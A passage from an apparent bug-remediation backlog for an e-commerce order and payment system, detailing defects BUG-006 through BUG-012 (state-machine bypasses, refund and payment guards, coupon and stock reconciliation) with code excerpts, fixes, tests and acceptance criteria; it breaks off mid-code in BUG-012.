**Testing Requirements:**
- Integration: create 3 orders → numbers `SX-1001`, `SX-1002`, `SX-1003` (or the next sequence values), strictly increasing.
- Integration: 50 rapid orders → 50 unique numbers, no `23505`.
- Failure: force a duplicate by setting the sequence back → the retry path recovers once and then surfaces a clear error.
- Regression: `orders.order_number` uniqueness still enforced by the DB.
- Data: existing timestamp numbers remain untouched and readable.

**Acceptance Criteria:**
- [ ] `Date.now()` no longer used for order numbers.
- [ ] Numbers come from `order_number_seq`.
- [ ] Sequence pre-advance step documented and applied.
- [ ] Retry path covers the unique-violation race.
- [ ] Existing orders unmodified.

**Implementation Complexity:** Low

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-006 — `updateOrderShipping` lets `staff` bypass the FSM, stock commitment and audit trail

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/actions/orders.ts
src/server/repositories/order.repository.ts
src/views/OrderDetail.tsx
```

**Problem Description:**
`updateOrderShipping` requires only `staff`, and it mutates `status` directly to `shipped` or `delivered` without consulting `ALLOWED_STATUS_TRANSITIONS`, without calling `updateOrderStatus`'s stock logic, and by writing the status **twice** (once via `updateShippingInfo`, once via `updateOrderStatus`, which also inserts a history row). Any order in any state can be pushed to `shipped` or `delivered`, including `cancelled` and `refunded` orders, skipping `confirmed` → `processing` entirely.

**Current Implementation:**
`src/server/services/order.service.ts:438-482`:
```ts
async updateOrderShipping(input, admin): Promise<Order> {
  assertRole(admin, ["staff"]);        // ← weaker than updateOrderStatus (admin)

  return db.transaction(async (tx) => {
    const current = await this.orderRepo.findForUpdate(input.orderId, tx);
    …
    const updateData: Record<string, unknown> = {};
    if (input.courier !== undefined) updateData.courier = input.courier;
    if (input.trackingNumber !== undefined) updateData.trackingNumber = input.trackingNumber;

    if (input.markShipped && current.status !== "shipped") {
      updateData.status = "shipped";       // ← no FSM check
      updateData.shippedAt = new Date();
    }
    if (input.markDelivered && current.status !== "delivered") {
      updateData.status = "delivered";     // ← no FSM check
      updateData.deliveredAt = new Date();
    }

    const updated = await this.orderRepo.updateShippingInfo(input.orderId, updateData, tx);

    if (updateData.status && updateData.status !== current.status) {
      await this.orderRepo.updateOrderStatus(     // ← second write + history
        current.id, updateData.status as OrderStatus, current.status as OrderStatus,
        `Shipping status updated with courier '${input.courier || "N/A"}'.`,
        admin.id, tx
      );
    }
    return updated;
  });
}
```
`src/server/repositories/order.repository.ts` `updateShippingInfo` writes whatever columns it is given, including `status`.

**Root Cause:**
Shipping information (courier, tracking) and order state were conflated into one method. The FSM lives in `updateOrderStatus`, which this path never calls.

**Real-World Failure Scenario:**
A staff member opens a `cancelled` order (customer cancelled before payment) to correct a typo in the tracking number, ticks "mark shipped" by mistake, and saves. The order becomes `shipped` with stock already released at cancellation — inventory is now permanently wrong (goods were never reserved, but the order claims to have shipped), the status history contains a fabricated transition, and no stock movement records the reversal. Because the refund path checks `status === 'delivered'`, the order can now be "refunded", paying out money for goods that were never sold.

**Required Implementation:**

1. **Separate concerns.** `updateOrderShipping` may modify only `courier` and `trackingNumber`. Remove `markShipped` / `markDelivered` from `updateOrderShippingSchema` and from this method.
2. Route state changes through the FSM:
   ```ts
   async updateOrderShipping(input, admin) {
     assertRole(admin, ["admin"]);           // see step 4
     return db.transaction(async (tx) => {
       const current = await this.orderRepo.findForUpdate(input.orderId, tx);
       if (!current) throw new NotFoundError("Order", input.orderId);
       const updated = await this.orderRepo.updateShippingInfo(input.orderId, {
         courier: input.courier, trackingNumber: input.trackingNumber,
       }, tx);
       return updated;
     });
   }
   ```
   If the UI needs a one-click "dispatching" flow, implement it as `updateOrderStatusAction({ orderId, status: "shipped", note })` — which already enforces the FSM, stock handling and history — followed by `updateOrderShippingAction({ courier, trackingNumber })`. Two explicit steps, one state machine.
3. Ensure `orderRepo.updateShippingInfo` rejects `status`/`shippedAt`/`deliveredAt` keys defensively (throw or ignore with a comment) so a future caller cannot reintroduce the bypass.
4. Raise `requiredRole` to `admin` to match `updateOrderStatusAction`, or keep `staff` **only if** the capability matrix (SEC-013 §6.1.1) says staff may dispatch. Decide once and record it in `AUTH_CONTEXT.md`. Recommendation: `admin`.
5. Update `src/views/OrderDetail.tsx`: the "Mark shipped" / "Mark delivered" controls must call `updateOrderStatusAction` (they likely already exist in the transition menu) and the shipping panel must no longer offer those checkboxes.
6. Verify no other caller depends on `markShipped` (`grep -rn "markShipped\|markDelivered" src/` — expect only the schema, the service and the view).

**Expected Behavior After Fix:**
Courier/tracking edits never change order state. `shipped`/`delivered` transitions flow through the FSM, recording stock movements and a single history row. A `cancelled` order cannot become `shipped` by any route.

**Dependencies:**
- **Depends on** BUG-002/BUG-004 (FSM and stock integrity in `updateOrderStatus` must be correct first).
- **Related** BUG-007 (refund FSM), SEC-004 (who can reach `staff`-level actions at all).

**Testing Requirements:**
- Normal: change courier on a `confirmed` order → courier updated, status unchanged, no history row.
- Normal: `confirmed` → `shipped` via `updateOrderStatusAction` → allowed, history row written, stock committed.
- Failure: `cancelled` → `shipped` (any path) → `VALIDATION_ERROR`.
- Failure: `refunded` → `shipped` → `VALIDATION_ERROR`.
- Failure: `updateOrderShipping` payload containing `markShipped` → rejected by schema validation.
- Regression: order detail UI still allows editing tracking.

**Acceptance Criteria:**
- [ ] `markShipped`/`markDelivered` removed from schema, service and UI.
- [ ] `updateShippingInfo` writes only shipping fields.
- [ ] All state changes go through `updateOrderStatus`.
- [ ] Role requirement aligned with the capability matrix.
- [ ] No double status write remains.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-007 — Cancellation and refund leave payments and coupon usage inconsistent

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/services/payment.service.ts
src/server/repositories/coupon.repository.ts
src/server/services/coupon.service.ts
```

**Problem Description:**
Cancelling or refunding an order does not reconcile the satellite records that were created for it.

(a) **Payments.** `updateOrderStatus` → `cancelled` writes the order status and adjusts stock, but never touches `payments`. A cancelled order that was already paid keeps a `paid` payment; a cancelled order awaiting verification keeps an `awaiting_verification` payment that the payments queue still shows as actionable. `approvePayment` will then happily confirm a cancelled order's payment (BUG-009).

(b) **Coupons.** Cancelling an order does not decrement `coupons.usage_count` nor delete the `order_coupons` row. `recordRedemption` incremented the counter at creation (`src/server/repositories/coupon.repository.ts:240-256`). The counter therefore only ever grows: a customer who cancels and re-orders burns two redemptions against a `usage_limit`, and `usageLimitPerCustomer` blocks them from retrying with the same code. For a first-order-only coupon, the cancelled order still counts as "first order used".

(c) **Inventory movements** are correctly handled (the code distinguishes reserved vs committed at lines 400-419), so only (a) and (b) are in scope here.

**Current Implementation:**
`src/server/services/order.service.ts:399-420` (cancellation branch) adjusts inventory and nothing else:
```ts
if (toStatus === "cancelled") {
  const wasCommitted = ["confirmed", "processing"].includes(fromStatus);
  const wasDispatched = ["shipped", "delivered"].includes(fromStatus);
  if (!wasDispatched) {
    for (const item of itemsList) { … cancelOrderStock(…) }
  }
  // Payment remains paid (refund requires explicit separate action).
}
```
There is no `payments` update and no `coupons` update anywhere in the file (`grep -n "payments\." src/server/services/order.service.ts` → only the `payments` import is absent entirely; the file imports `orders` but not `payments`).

**Root Cause:**
The cancellation branch was written to solve the stock problem (ADR 020 Scenario A/B/C) and treated payments as an out-of-scope concern to be handled "later" by a separate action. Coupon reversal was never modelled at all: `recordRedemption` had no counterpart.

**Real-World Failure Scenario:**
A customer applies `WELCOME10` (limit 1 per customer), pays, then cancels because the size was wrong. They re-order the correct size and `WELCOME10` is rejected with "You have already reached the maximum usage limit (1)". Support manually edits the coupon counter in the database — a process that does not exist and would not be auditable. Meanwhile finance sees a `paid` payment attached to a cancelled order and cannot tell whether a refund is owed.

**Required Implementation:**

1. Introduce an explicit, single-purpose reconciliation in the cancellation branch of `updateOrderStatus` (inside the existing transaction):
   ```ts
   if (toStatus === "cancelled") {
     // 1. Stock (existing logic, unchanged)
     …
     // 2. Payments: any non-terminal payment must not remain actionable
     await this.paymentRepo.markOrderPaymentsCancelled(currentOrder.id, tx); // see step 2
     // 3. Coupons: reverse redemption for this order, exactly once
     await this.couponService.releaseOrderRedemption(currentOrder.id, tx);  // see step 3
   }
   ```
2. Add `PaymentRepository.markOrderPaymentsCancelled(orderId, tx)`:
   - `status = 'pending' | 'awaiting_verification' | 'rejected'` → set `status = 'failed'`, `rejectionReason = 'Order cancelled'`, append to `metadata.rejectionHistory` with `{ by: 'system', at, reason }`.
   - `status = 'paid'` → **leave as `paid`** and set `metadata.refundRequired = true` (a cancellation is not a refund; money movement is explicit — see BUG-010). Surface this in the UI as "Refund required".
   - `status = 'refunded'` / `'failed'` → no change.
3. Add `CouponService.releaseOrderRedemption(orderId, tx)`:
   - Read `order_coupons` for the order. If no row, no-op (idempotent).
   - `DELETE FROM order_coupons WHERE order_id = ?` (or set a `released_at` column — see DB-007; the delete is acceptable because `usage_count` is the only derived value and `order_coupons` has no history requirement, but **document the choice**).
   - `UPDATE coupons SET usage_count = GREATEST(usage_count - 1, 0) WHERE id = ?`.
   - Must be safe to call twice (guard on the `order_coupons` row's existence).
4. Apply the same reconciliation to `refundPayment` when it drives the order to `refunded` (BUG-010) — a refunded order must also release the coupon.
5. Do **not** release coupons when an order is merely `cancelled` by the *customer before payment* in a future storefront flow unless the same transaction runs; state the rule: "coupon release happens exactly when the order leaves the fulfilment lifecycle."
6. Emit one `order_status_history` row describing the reconciliation (e.g. `note = 'Cancelled: payments failed, coupon released'`) so the audit trail explains the satellite changes.

**Expected Behavior After Fix:**
A cancelled order has no actionable payments, shows "refund required" when money was collected, and no longer consumes coupon usage. Re-ordering with the same coupon works when limits allow. Every one of these changes appears in the order history.

**Dependencies:**
- **Depends on** BUG-006 (FSM must be the only path to `cancelled`), BUG-009/BUG-010 (payment state guards).
- **Related** DB-007 (coupon release schema decision), ECOM-002 (returns).

**Testing Requirements:**
- Cancel with `awaiting_verification` payment → payment `failed`, reason recorded, payments queue no longer shows it.
- Cancel with `paid` payment → payment stays `paid`, `metadata.refundRequired = true`, UI shows the flag.
- Cancel with coupon → `order_coupons` row gone, `usage_count` decremented by exactly 1.
- Cancel twice (idempotent) → no double decrement.
- Re-order with the same coupon after cancellation → accepted.
- Rollback: force an error after the coupon release → all changes roll back atomically.

**Acceptance Criteria:**
- [ ] Cancellation updates payments per the matrix above.
- [ ] Cancellation releases exactly one coupon redemption.
- [ ] Both operations are idempotent and transactional.
- [ ] History row explains the reconciliation.
- [ ] No `awaiting_verification` payment remains on a cancelled order.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### BUG-008 — `submitPaymentProof` has no state guard and overwrites terminal payments

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
src/actions/payments.ts
src/server/validation/payments.ts
```

**Problem Description:**
`submitPaymentProof` accepts a `paymentId` in any state and overwrites it to `awaiting_verification`, including payments that are already `paid`, `refunded`, or `failed`. It also advances the **order** from `awaiting_payment` to `payment_submitted` without checking that the payment belongs to an order in a compatible state, and it is callable at `staff` level with no ownership or state checks.

**Current Implementation:**
`src/server/services/payment.service.ts:81-138`:
```ts
async submitPaymentProof(input: SubmitPaymentProofInput): Promise<Payment> {
  const existing = await this.paymentRepo.findById(input.paymentId);
  if (!existing) throw new NotFoundError("Payment", input.paymentId);

  return db.transaction(async (tx) => {
    const order = await this.orderRepo.findForUpdate(existing.orderId, tx);   // locked
    const payment = await this.paymentRepo.findForUpdate(input.paymentId, tx); // locked
    …
    const updatedPayment = await this.paymentRepo.update(payment.id, {
      status: "awaiting_verification",       // ← unconditional
      …proofUrl, metadata, transactionReference…
    }, tx);

    if (order.status === "awaiting_payment") {
      await this.orderRepo.updateOrderStatus(order.id, "payment_submitted", "awaiting_payment", …);
    }
    return updatedPayment!;
  });
}
```
There is no check of `payment.status`, of `order.status` beyond the single equality, or of whether the order is `cancelled`/`refunded`.

**Root Cause:**
The method models "the customer has submitted proof" as an unconditional write, ignoring that the payment row is a state machine with terminal states.

**Real-World Failure Scenario:**
A refunded order's payment (status `refunded`) receives another proof upload — the row flips to `awaiting_verification`, leaving a refunded payment that looks unpaid. Finance re-approves it (BUG-009 permits it), producing a `paid` payment against a `refunded` order: the customer is charged twice and the ledger cannot be reconciled. Alternatively, a cancelled order's payment becomes `awaiting_verification`, reappearing in the verification queue with no order to fulfil.

**Required Implementation:**

1. Add an explicit allowed-source-state set:
   ```ts
   const SUBMITTABLE = new Set(["pending", "rejected", "awaiting_verification"]);
   if (!SUBMITTABLE.has(payment.status)) {
     throw new ValidationError(
       `Payment with status '${payment.status}' cannot accept a new proof.`
     );
   }
   ```
   `awaiting_verification` is included so a customer can replace a proof before review; re-submission must reset `verifiedBy`/`verifiedAt`/`rejectionReason` to `null`.
2. Validate the order state: only `awaiting_payment`, `payment_submitted`, or `pending` (COD) may receive a proof. `cancelled`/`refunded`/`delivered` ⇒ `ValidationError("This order can no longer accept payment proof.")`.
3. Verify the payment belongs to the order (`payment.orderId === order.id` — it does by construction, but assert it to be explicit).
4. Recompute the affected order status from the payment state rather than a single equality:
   - `order.status === "awaiting_payment"` → `payment_submitted`
   - otherwise leave the order status untouched (never downgrade `confirmed`/`processing` because a proof was re-uploaded)
5. Authorization: keep `requiredRole: "staff"` for the admin-console flow (staff upload proofs on a customer's behalf), but add an audit note in `metadata` recording `submittedBy: admin.id`. The action currently discards `admin`; change `async ({ input })` to `async ({ input, admin })` and pass `admin.id` into the service.
6. Validate `transactionReference` shape (`/^[A-Za-z0-9._-]{4,64}$/`) and normalise case, so duplicate detection (ECOM-006) can rely on it.

**Expected Behavior After Fix:**
Only `pending`, `rejected` and `awaiting_verification` payments accept a proof. Terminal payments are immutable through this path. The order status only advances forward. Every submission records who submitted it.

**Dependencies:**
- **Depends on** BUG-007 (cancellation must fail payments), BUG-010 (refund semantics).
- **Blocks** ECOM-006 (duplicate TID detection needs a clean state model).

**Testing Requirements:**
- Normal: `pending` payment + valid proof → `awaiting_verification`, order `payment_submitted`, `metadata.submittedBy` set.
- Failure: `paid` payment → `VALIDATION_ERROR`, no change.
- Failure: `refunded` payment → `VALIDATION_ERROR`.
- Failure: order `cancelled` → `VALIDATION_ERROR`.
- Normal: resubmission while `awaiting_verification` → status unchanged, proof replaced, `verifiedAt` reset.
- Regression: COD orders (no payment row until delivery) are unaffected.

**Acceptance Criteria:**
- [x] Source-state allowlist enforced inside the transaction.
- [x] Order-state validation added.
- [x] Order status never downgrades.
- [x] `submittedBy` recorded.
- [x] Transaction reference validated.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### BUG-009 — `approvePayment` can confirm payments on cancelled or refunded orders

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
```

**Problem Description:**
`approvePayment` marks the payment `paid` unconditionally (after a single idempotency check for `paid`), then advances the order to `confirmed` **only if** the order is in `awaiting_payment`/`payment_submitted`. For a cancelled or refunded order, the payment becomes `paid` while the order stays `cancelled`/`refunded`: money is recorded as received against an order that will never ship, and stock is never committed (the `if` block is skipped).

**Current Implementation:**
`src/server/services/payment.service.ts:141-217`:
```ts
if (payment.status === "paid") return payment;

const updatedPayment = await this.paymentRepo.update(payment.id, {
  status: "paid", verifiedBy: admin.id, verifiedAt: now, paidAt: now, rejectionReason: null,
}, tx);

if (["awaiting_payment", "payment_submitted"].includes(order.status)) {
  await this.orderRepo.updateOrderStatus(order.id, "confirmed", order.status as OrderStatus, …);
  const orderBundle = await this.orderRepo.findById(order.id, tx);
  if (orderBundle?.items) { for (const item of orderBundle.items) { … commitOrderSale(…) } }
}
return updatedPayment!;
```
There is no guard for `payment.status ∈ {refunded, failed}` and no guard for `order.status ∈ {cancelled, refunded}`.

**Root Cause:**
The status transition was written as "advance if possible" (permissive) instead of "advance if and only if legal" (strict), so an illegal order state silently degrades into a paid-but-unfulfillable order.

**Real-World Failure Scenario:**
A customer cancels; support later finds a bank transfer had arrived and clicks "Approve" in the payments queue (the payment is still listed because BUG-007 never failed it). The payment becomes `paid`, the order stays `cancelled`, stock is never committed, and the customer is not refunded automatically. Finance's revenue report (which sums paid payments, not order totals) now overstates income.

**Required Implementation:**

1. Add a terminal-state guard for the payment:
   ```ts
   if (["paid", "refunded", "failed"].includes(payment.status)) {
     throw new ValidationError(`Cannot approve a payment with status '${payment.status}'.`);
   }
   ```
   Keep the `paid` idempotency early-return **before** this guard for repeated approvals (return the payment unchanged rather than erroring), and apply the guard only to `refunded`/`failed`.
2. Add an order-state guard:
   ```ts
   if (["cancelled", "refunded"].includes(order.status)) {
     throw new ValidationError(
       `Order ${order.orderNumber} is ${order.status} and cannot accept payment approval. ` +
       `Record the receipt as a refund-required payment instead.`
     );
   }
   ```
3. Make the order advance **mandatory**, not conditional: if the order is not in an approvable state, fail the transaction. States that legitimately accept approval: `awaiting_payment`, `payment_submitted`, `pending` (COD collection), and `confirmed`/`processing` (a second instalment). For the latter two, do **not** re-run `commitOrderSale` — guard with `if (order.status === "awaiting_payment" || order.status === "payment_submitted" || order.status === "pending")`.
4. Ensure `commitOrderSale` is invoked exactly once per order transition to `confirmed` (it is already idempotent per ADR 018 — verify with the test below).
5. Record the approval in `order_status_history` even when the order status does not change (instalment case): insert a history row with `from = to = current` and a note, so there is an audit trail.

**Expected Behavior After Fix:**
A payment on a cancelled or refunded order cannot be approved through the normal path; the UI offers "record refund-required receipt" instead. Approval always results in a `confirmed` order with committed stock (for the first payment) or an audited instalment (for subsequent ones).

**Dependencies:**
- **Depends on** BUG-007 (cancellation payment handling) and BUG-008.
- **Related** BUG-010 (refund), BUG-011 (funds-received guard on cancellation).

**Testing Requirements:**
- Normal: `awaiting_verification` payment on `payment_submitted` order → `paid`, order `confirmed`, stock committed once.
- Failure: payment on `cancelled` order → `VALIDATION_ERROR`, both rows unchanged.
- Failure: `refunded` payment → `VALIDATION_ERROR`.
- Normal: approve twice → second call returns the same payment, no duplicate commit (assert one `inventory_movements` row of reason `sale`).
- Edge: second instalment on a `confirmed` order → payment `paid`, order unchanged, history row added.

**Acceptance Criteria:**
- [x] Terminal payment states rejected.
- [x] Cancelled/refunded orders rejected.
- [x] Order advance is mandatory for the first payment.
- [x] `commitOrderSale` executes exactly once.
- [x] Instalment approvals audited.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### BUG-010 — `refundPayment` skips the FSM, skips stock restoration and allows partial-refund incoherence

**Priority:** P0
**Category:** Bug
**Severity:** Critical
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
src/views/OrderDetail.tsx
src/server/validation/payments.ts
src/db/schema/payments.ts
```

**Problem Description:**
Three defects.

(a) **No FSM.** `refundPayment` sets the payment to `refunded` and, when every payment on the order is refunded, sets the order to `refunded` via `orderRepo.updateOrderStatus(…)` — which in the repository layer writes the status directly, **bypassing** `OrderService.updateOrderStatus` and therefore bypassing `ALLOWED_STATUS_TRANSITIONS` and stock handling.

(b) **No stock restoration.** A refund on a `confirmed`/`processing` order (goods never shipped) should return the units to sellable stock — `commitOrderSale` moved them from reserved to sold; refunding should move them back. Nothing does. The units are lost from inventory permanently.

(c) **Partial refunds are fiction.** The UI collects a `refundAmount` but the service signature has no amount field; the view concatenates it into the free-text `reason` (`OrderDetail.tsx:357-358`: `` `${refundReason.trim()} (Amount: PKR ${num})` ``). The database stores `status = 'refunded'` with no amount, so a PKR 500 partial refund on a PKR 5,300 order looks identical to a full refund.

**Current Implementation:**
`src/server/services/payment.service.ts:291-352`:
```ts
if (payment.status !== "paid") throw new ValidationError(…);
const updatedPayment = await this.paymentRepo.update(payment.id, { status: "refunded" }, tx);
const allPayments = await this.paymentRepo.findByOrderId(order.id, tx);
const allRefunded = allPayments.every((p) => p.id === payment.id ? true : p.status === "refunded");
if (allRefunded) {
  await this.orderRepo.updateOrderStatus(order.id, "refunded", order.status as OrderStatus,
    `Payment of PKR ${payment.amount} refunded. Reason: ${input.reason}`, admin.id, tx);
}
```
`RefundPaymentInput` in `src/server/validation/payments.ts` has `paymentId` + `reason` only (no amount).

**Root Cause:**
Refunds were modelled as a status flip on the payment row, assuming "all payments refunded ⇒ order refunded". Stock return and partial amounts were never part of the model.

**Real-World Failure Scenario:**
An order is confirmed, stock committed (10 units sold). The customer returns the item; support refunds. The order becomes `refunded`, but the 10 units are neither in `quantity_on_hand` nor in `quantity_reserved` — the SKU shows 0 available while 10 physical units sit in the warehouse. The product silently goes out of stock and stops selling. Separately, finance cannot tell a full refund from a goodwill partial refund, so the revenue report overstates refunds for full returns and understates them for partial ones.

**Required Implementation:**

1. **Route through the service FSM.** Refund must call `orderService.updateOrderStatus({ orderId, status: "refunded", note }, admin)` rather than the repository, so `ALLOWED_STATUS_TRANSITIONS`, history and any stock logic apply. Only `shipped` and `delivered` currently allow → `refunded` (`ALLOWED_STATUS_TRANSITIONS.shipped = ["delivered","cancelled","refunded"]`, `delivered = ["refunded"]`). For a **pre-shipment** refund the legal transition is `cancelled` (which already restores stock per BUG-007). Therefore:
   - `order.status ∈ {confirmed, processing}` → refund must first cancel (restores stock), then record the refund.
   - `order.status ∈ {shipped, delivered}` → refund is the terminal transition; **do not** auto-restock (goods left the building). Offer an explicit "restock returned goods" action (ECOM-002).
2. **Add an amount to the refund model.** Extend `payments` with `refund_amount numeric(12,2) NULL` and `refunded_at timestamptz NULL` (migration DB-005). Amend `refundPaymentSchema`:
   ```ts
   refundAmount: pricePkrSchema.refine(v => v > 0, "Refund amount must be positive"),
   reason: z.string().trim().min(3).max(500),
   restock: z.boolean().optional().default(false),
   ```
   Validate `refundAmount <= payment.amount - COALESCE(refund_amount,0)`.
3. **Partial refunds must not flip the order.** Only a full refund (sum of refunds across payments equals `orders.total`) transitions the order to `refunded`. A partial refund records `refund_amount` and leaves the order status intact, with a history note.
4. **Stock restoration** only when `restock === true` **and** the order has not been dispatched. Call `inventoryService.cancelOrderStock(variantId, qty, orderId, /* wasCommitted */ true, admin.id, tx)` per item, which already inserts a `return`-reason movement (verify: `cancelOrderStock` supports committed restore; if it only writes `cancellation`, add a `return` variant — see ECOM-002).
5. Update `src/views/OrderDetail.tsx`: send `refundAmount` as a number, stop embedding it in the reason; display recorded refunds with amount and date; disable the button when the payment is not `paid`.
6. Keep everything inside the existing `db.transaction` and preserve lock order `orders → payments → inventory`.

**Expected Behavior After Fix:**
A full refund on a delivered order sets `payment.status = 'refunded'`, `refund_amount = payment.amount`, `refunded_at`, and the order to `refunded` with a history row. A partial refund records the amount and leaves the order status alone. A pre-shipment refund cancels the order (restoring stock) and records the refund. No path writes `orders.status` outside the service FSM.

**Dependencies:**
- **Depends on** BUG-007 (cancellation/stock), BUG-009 (approval guards).
- **Related** DB-005 (refund columns), ECOM-002 (returns/restock), ECOM-003 (exchanges).

**Testing Requirements:**
- Full refund on `delivered` → payment `refunded` with amount, order `refunded`, no restock.
- Partial refund (500 of 5300) → payment keeps `paid` with `refund_amount = 500`, order status unchanged, history note.
- Pre-shipment refund on `confirmed` → order `cancelled` + stock restored + payment `refunded`.
- Refund exceeding the payment amount → `VALIDATION_ERROR`.
- Refund on a `pending` payment → `VALIDATION_ERROR`.
- Double full refund → second attempt rejected.
- Regression: `allPayments.every(...)` logic replaced by an explicit full-refund sum check.

**Acceptance Criteria:**
- [x] Order status never written outside `OrderService.updateOrderStatus`.
- [x] `refund_amount`/`refunded_at` persisted.
- [x] Partial refunds do not change order status.
- [x] Stock restored only for pre-shipment refunds or explicit restock.
- [x] UI sends a numeric amount.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### BUG-011 — `markOrderPaymentPending` strands committed stock and confirmed orders

**Priority:** P0
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
src/views/OrderDetail.tsx
```

**Problem Description:**
`markOrderPaymentPending` resets a payment to `pending` and nulls `paidAt`/`verifiedAt`/`verifiedBy`, but does nothing to the order or to stock. If the order was already `confirmed` and `commitOrderSale` had run, the order remains `confirmed` with stock permanently sold, while the payment claims nothing was received — the exact inverse of the truth. There is also no state guard: the method will happily "unpay" a payment that belongs to a `shipped`/`delivered` order.

**Current Implementation:**
`src/server/services/payment.service.ts:465-503`:
```ts
assertRole(admin, ["admin"]);
return db.transaction(async (tx) => {
  const order = await this.orderRepo.findForUpdate(orderId, tx);
  if (!order) throw new NotFoundError("Order", orderId);
  let payment = details.paymentId
    ? await this.paymentRepo.findForUpdate(details.paymentId, tx)
    : (await this.paymentRepo.findByOrderId(orderId, tx))[0];
  if (payment) {
    return this.paymentRepo.update(payment.id, {
      status: "pending", paidAt: null, verifiedAt: null, verifiedBy: null,
    }, tx);
  }
  return null;
});
```
No check on `order.status`, no reversal of `commitOrderSale`, no history row.

**Root Cause:**
The method was built as a manual correction tool ("I marked it paid by mistake") without modelling the consequences of undoing a payment that had already advanced the order.

**Real-World Failure Scenario:**
An admin accidentally marks a bank transfer paid; the order is confirmed and 6 units are committed as sold. Realising the mistake, they click "mark pending". The payment reverts, but the order stays `confirmed` and the 6 units stay sold. The SKU now shows 6 fewer available units than reality, and a later genuine sale oversells.

**Required Implementation:**

1. Add guards:
   - `order.status ∈ {cancelled, refunded}` → `ValidationError`.
   - `order.status ∈ {shipped, delivered}` → `ValidationError("Delivered orders cannot be marked unpaid; use a refund.")`.
   - `payment.status === "refunded"` → `ValidationError`.
2. If `order.status` is `confirmed` or `processing` (i.e. stock was committed) **and** this payment was the one that caused confirmation, reverse the commitment explicitly:
   - `inventoryService.cancelOrderStock(variantId, qty, order.id, /* wasCommitted */ true, admin.id, tx)` per item — this returns units to `quantity_on_hand` and logs a movement.
   - Transition the order back to `awaiting_payment` through the service FSM. Note: the FSM has no `confirmed → awaiting_payment` edge. Add one, explicitly, with a documented rationale ("payment reversal correction"), and **only** reachable from this method — or introduce a dedicated `correctPaymentReversal` path recorded in history. Preferred: add the edge to `ALLOWED_STATUS_TRANSITIONS.confirmed` as `["processing", "cancelled", "awaiting_payment"]` and gate it behind `admin` + a mandatory `note`.
3. Write an `order_status_history` row describing the correction, including the admin's note.
4. Append to `payment.metadata.corrections`: `[{ by, at, from: 'paid', to: 'pending', note }]` — never erase history.
5. If `details.paymentId` is omitted, select the **latest** payment deterministically (`ORDER BY created_at DESC LIMIT 1`), not `[0]` of an unordered array (current code relies on array order).

**Expected Behavior After Fix:**
Marking a payment unpaid either (a) refuses, or (b) fully reverses the confirmation — stock returned, order back to `awaiting_payment`, history and metadata recording who did it and why. No state is left half-reversed.

**Dependencies:**
- **Depends on** BUG-009, BUG-010 (state model), BUG-004 (stock primitives).
- **Related** DB-012 (movement reason `correction`).

**Testing Requirements:**
- Normal: paid payment on `confirmed` order → reversed; stock returns; order `awaiting_payment`; history + metadata written.
- Failure: `delivered` order → `VALIDATION_ERROR`.
- Failure: `refunded` payment → `VALIDATION_ERROR`.
- Edge: order with two payments → only the targeted payment reverts; stock reversal happens at most once.
- Idempotency: repeat the call → no second stock reversal.

**Acceptance Criteria:**
- [x] Guards on order and payment state.
- [x] Stock commitment reversed when applicable.
- [x] Order returned to a coherent state via the FSM.
- [x] History and metadata capture the correction.
- [x] Deterministic payment selection.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

### BUG-012 — `updateOrderStatus` allows `confirmed` without a payment and `processing` without confirmation checks

**Priority:** P0
**Category:** Bug
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/views/OrderDetail.tsx
```

**Problem Description:**
The FSM permits `awaiting_payment → confirmed` and `payment_submitted → confirmed` directly, and `updateOrderStatus` performs no payment check. An admin can confirm an unpaid order — stock is committed as sold while no money exists — and the order then flows through fulfilment. This is the manual counterpart to BUG-009 and is reachable from the order detail screen's status menu.

**Current Implementation:**
`src/server/services/order.service.ts:42-53`:
```ts
const ALLOWED_STATUS_TRANSITIONS: Record<OrderStatus, OrderStatus[]> = {
  awaiting_payment: ["payment_submitted", "confirmed", "cancelled"],
  payment_submitted: ["confirmed", "awaiting_payment", "cancelled"],
  pending: ["confirmed", "cancelled"],
  confirmed: ["processing", "cancelled"],
  processing: ["shipped", "cancelled"],
  shipped: ["delivered", "cancelled", "refunded"],
  delivered: ["refunded"],
  cancelled: [],
  refunded: [],
};
```
The transition handler (`lines 356-435`) branches on `toStatus === "confirmed"` only to run `commitOrderSale`; it never inspects payments. `src/views/OrderDetail.tsx` mirrors the same table in `ALLOWED_ORDER_TRANSITIONS` (lines 121-131), so the UI offers "Confirmed" for `awaiting_payment` orders.

**Root Cause:**
The FSM encodes *permitted order statuses* but not *preconditions*. Confirmation was assumed to be driven only by payment approval, which BUG-006/BUG-009 proved false.

**Real-World Failure Scenario:**
Staff confirms a COD order by phone and clicks "Confirmed" before collecting. Stock is committed. The customer never pays and the parcel is refused. Because the order went `confirmed → processing → shipped → delivered`, no path returns the stock, and the SKU is permanently short.

**Required Implementation:**

1. Introduce explicit transition preconditions in `OrderService`:
   ```ts
   private async assertTransitionPreconditions(orderId, toStatus, tx) {
     if (toStatus === "confirmed") {
       const payments = await this.paymentRepo.findByOrderId(orderId, tx);
